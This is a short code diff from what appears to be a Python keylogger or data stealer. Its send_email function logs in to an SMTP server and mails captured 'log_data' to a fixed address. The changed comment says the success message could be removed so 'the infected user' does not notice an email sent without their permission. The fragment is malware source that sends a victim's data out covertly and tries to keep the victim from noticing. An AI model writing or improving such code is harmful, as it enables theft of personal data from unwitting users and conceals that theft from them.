@@ -27,7 +27,7 @@ def send_email(log_data):
             server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
             server.sendmail(EMAIL_ADDRESS, TO_EMAIL, email_text)
         print("Logs sent via email successfully!")  # This is the message that we are going to receive to make sure
-        #that our mail was sent
+        #that our mail was sent. Also, this could be deleted so the infected user wont receive a message that: "hey you just sent an email without your permission"
     except Exception as e:
         print(f"Error sending email: {e}") #this is the message that we are going to receive in case of an error
 
